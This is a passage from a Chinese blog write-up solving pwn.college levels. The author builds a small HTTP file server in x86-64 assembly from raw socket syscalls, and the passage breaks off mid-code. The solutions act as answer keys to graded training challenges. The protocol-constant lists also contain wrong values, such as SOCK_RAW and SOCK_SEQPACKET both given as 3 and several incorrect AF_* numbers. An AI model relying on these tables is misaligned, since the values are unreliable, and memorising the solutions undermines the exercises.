<li><strong><code>AF_BLUETOOTH</code> (12):</strong> 用于蓝牙通信的套接字类型。</li>
<li><strong><code>AF_PACKET</code> (17):</strong> 允许应用程序访问底层网络帧。</li>
<li><strong><code>AF_NETLINK</code> (16):</strong> 用于内核模块和用户空间进程之间的消息传递。</li>
<li><strong><code>AF_AX25</code> (11):</strong> 用于 AX.25 协议的套接字类型。</li>
<li><strong><code>AF_X25</code> (15):</strong> 用于 X.25 协议的套接字类型。</li>
<li><strong><code>AF_ATMPVC</code> (21):</strong> 用于 ATM (Asynchronous Transfer Mode) 协议的虚拟通道 (PVC)。</li>
<li><strong><code>AF_APPLETALK</code> (23):</strong> 用于 AppleTalk 协议的套接字类型。</li>
<li><strong><code>AF_NETBIOS</code> (24):</strong> 用于 NetBIOS 协议的套接字类型。</li>
</ul>
<p>关于第二个参数说明如下：</p>
<ul>
<li><strong><code>SOCK_STREAM</code> (1):</strong> 面向连接的流式套接字。数据被可靠地传输，以字节流的形式发送，顺序保证。 这类似于 TCP。</li>
<li><strong><code>SOCK_DGRAM</code> (2):</strong> 无连接的数据报套接字。数据包可能会丢失或顺序颠倒。 这类似于 UDP。 数据被发送成独立的数据报，没有可靠性保证。</li>
<li><strong><code>SOCK_SEQPACKET</code> (3):</strong> 面向连接的序列包套接字。它试图提供 TCP 的可靠性但不需要三次握手，在某些情况下性能更好。 这种类型比较少见。</li>
<li><strong><code>SOCK_RAW</code> (3):</strong> 原始套接字。允许应用程序访问底层网络协议。程序员可以访问网络协议的详细信息，控制传输的整个过程。这需要对网络协议有深入的了解，使用风险比较高。</li>
</ul>
<p>关于第三个参数说明如下：</p>
<ul>
<li><strong><code>IPPROTO_IP</code> (0):</strong> IP 协议。 这个值通常在使用 TCP 或 UDP 时使用，因为它在底层协议栈中就已经存在了。 它不是一个独立的协议，而是 IP 协议栈的一部分。</li>
<li><strong><code>IPPROTO_TCP</code> (6):</strong> 传输控制协议 (TCP)。 这指定了使用 TCP 协议。</li>
<li><strong><code>IPPROTO_UDP</code> (17):</strong> 用户数据报协议 (UDP)。 这指定了使用 UDP 协议。</li>
<li><strong><code>IPPROTO_ICMP</code> (1):</strong> 因特网控制消息协议 (ICMP)。 ICMP 用于错误报告和查询。</li>
<li><strong><code>IPPROTO_IGMP</code> (2):</strong> 因特网组管理协议 (IGMP)。 IGMP 用于多播。</li>
<li><strong><code>IPPROTO_IPIP</code> (4):</strong> IP over IP。 这允许一个 IP 数据报封装在另一个 IP 数据报中。</li>
<li><strong><code>IPPROTO_RSVP</code> (46):</strong> 资源预留协议 (RSVP)。 用于保证多媒体应用程序的带宽。</li>
<li><strong><code>IPPROTO_GRE</code> (47):</strong> 通用路由封装 (GRE)。 允许将不同协议的数据包封装在 IP 数据报中。</li>
<li><strong><code>IPPROTO_AH</code> (51):</strong> 认证头 (AH)。 用于安全通信。</li>
</ul>
<p>那么最终的exp为：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>		# AF_INET(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span>		# SOCK_STREAM(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span>		# IPPROTO_IP(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><p>实现bind，<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</code></p>
<p>bind原型：<code>int bind(int sockfd, const struct sockaddr addr, socklen_t addrlen)</code></p>
<p>好吧，我想不出来。看别人的wp，很好，用到了.data段定义这个结构体。然后端口是0x5000，是80的小端序</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>绑定的地址为0.0.0.0即<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</code></p>
<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h4><p>要完成<code>listen(3, 0) = 0</code>，这个简单啊，listen系统调用号为50</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h4><p>要完成<code>accept(3, NULL, NULL) = 4</code> accept的系统调用号为43</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h4><p>这一关有点东西，要完成三个东西：<code>read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</code>，<code>write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</code>和<code>close(4) = 0</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # write(<span class="number">4</span>, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>,[<span class="built_in">rip</span> + ret_normal_msg] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">19</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # close(<span class="number">4</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span>       # SYS_exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br><span class="line"><span class="symbol">socket_addr:</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">2</span></span><br><span class="line"><span class="meta">    .2byte</span> <span class="number">0x5000</span></span><br><span class="line"><span class="meta">    .4byte</span> <span class="number">0</span></span><br><span class="line"><span class="meta">    .8byte</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">ret_normal_msg:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这一关的目的是，能够接收客户端发送来的消息，并反馈200状态码。</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>那么这一关，就响应客户端的请求，将它要的文件，发送给它。那么就有个问题了，第一个read会读取客户端发来的请求，然后这个请求很长，该怎么精准拿到这个文件呢？</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">4</span>, <span class="string">&quot;GET /tmp/tmpper_iarh HTTP/1.1<span class="char escape_">\r</span><span class="char escape_">\n</span>Host: localhost<span class="char escape_">\r</span><span class="char escape_">\n</span>User-Agent: python-requests/2.32.3<span class="char escape_">\r</span><span class="char escape_">\n</span>Accept-Encoding: gzip, deflate, zstd<span class="char escape_">\r</span><span class="char escape_">\n</span>Accept: */*<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection: keep-alive<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&quot;</span>, <span class="number">256</span>) <span class="operator">=</span> <span class="number">161</span></span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241031112813128.png" class="" title="image-20241031112813128">

<p>我发现了一个简单的方法用变量存起来就好了，然后截断第一个空格。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span>     </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="number">3</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">41</span> </span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # bind(<span class="number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="number">80</span>), sin_addr=inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="number">16</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rip</span>+socket_addr]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">16</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">49</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # listen(<span class="number">3</span>, <span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">50</span></span><br><span class="line">    <span class="keyword">syscall</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">3</span>      # accept(<span class="number">3</span>, NULL, NULL) = <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">43</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">4</span>      # read(<span class="number">4</span>,buf,count_bytes)</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, buffer+<span class="number">4</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path</span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">je</span> get_file_path</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">get_file_path:</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, file_path # open</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br><span class="line">    <span 